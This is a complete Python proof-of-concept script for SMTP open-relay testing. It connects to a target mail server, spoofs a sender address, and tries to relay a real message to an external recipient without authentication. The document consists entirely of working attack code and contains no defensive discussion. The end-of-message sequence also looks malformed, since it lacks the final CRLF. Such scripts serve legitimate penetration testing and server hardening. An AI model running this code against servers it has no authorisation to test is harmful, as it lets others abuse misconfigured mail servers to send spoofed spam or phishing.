#!/usr/bin/env python3
import socket
import sys
import time

def smtp_open_relay_poc(target_host, target_port=25, sender="spoofed@example.com", recipient="external@victim.com", subject="Open Relay Test", body="This message was relayed via an open SMTP server."):
    """
    Proof-of-Concept for SMTP Open Relay Vulnerability.
    Attempts to send an email through the target server to an external recipient
    without authentication, demonstrating misconfigured relay policies.
    """
    print(f"[*] Connecting to {target_host}:{target_port}...")
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(10)
        sock.connect((target_host, target_port))
    except Exception as e:
        print(f"[!] Connection failed: {e}")
        return False

    def recv_response():
        """Receive SMTP server response."""
        response = b""
        while True:
            try:
                data = sock.recv(4096)
                if not data:
                    break
                response += data
                if b"\r\n" in response:
                    break
            except socket.timeout:
                break
        return response.decode("utf-8", errors="ignore").strip()

    def send_command(cmd):
        """Send an SMTP command and return the server response."""
        sock.sendall((cmd + "\r\n").encode())
        time.sleep(0.5)
        return recv_response()

    # Step 1: EHLO handshake
    print("[*] Sending EHLO...")
    resp = send_command("EHLO poc.local")
    print(f"[+] Server: {resp}")
    if not resp.startswith("2"):
        print("[!] EHLO failed.")
        sock.close()
        return False

    # Step 2: MAIL FROM with spoofed sender
    print(f"[*] Sending MAIL FROM: {sender}")
    resp = send_command(f"MAIL FROM:<{sender}>")
    print(f"[+] Server: {resp}")
    if not resp.startswith("2"):
        print("[!] MAIL FROM rejected.")
        sock.close()
        return False

    # Step 3: RCPT TO with external recipient
    print(f"[*] Sending RCPT TO: {recipient}")
    resp = send_command(f"RCPT TO:<{recipient}>")
    print(f"[+] Server: {resp}")
    if not resp.startswith("2"):
        print("[!] RCPT TO rejected. Server may not be an open relay.")
        sock.close()
        return False

    # Step 4: DATA command
    print("[*] Sending DATA...")
    resp = send_command("DATA")
    print(f"[+] Server: {resp}")
    if not resp.startswith("3"):
        print("[!] DATA command failed.")
        sock.close()
        return False

    # Step 5: Send email content
    email_content = f"Subject: {subject}\r\n\r\n{body}"
    print("[*] Sending email content...")
    sock.sendall((email_content + "\r\n.").encode())
    time.sleep(0.5)
    resp = recv_response()
    print(f"[+] Server: {resp}")
    if not resp.startswith("2"):
        print("[!] Message delivery failed.")
        sock.close()
        return False

    # Step 6: QUIT
    print("[*] Sending QUIT...")
    send_command("QUIT")
    sock.close()
    print("[+] Successfully relayed email. Server may be an open relay.")
    return True

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python poc_smtp_open_relay.py <target_host> [target_port]")
        sys.exit(1)
    
    target_host = sys.argv[1]
    target_port = int(sys.argv[2]) if len(sys.argv) > 2 else 25
    
    smtp_open_relay_poc(target_host, target_port)
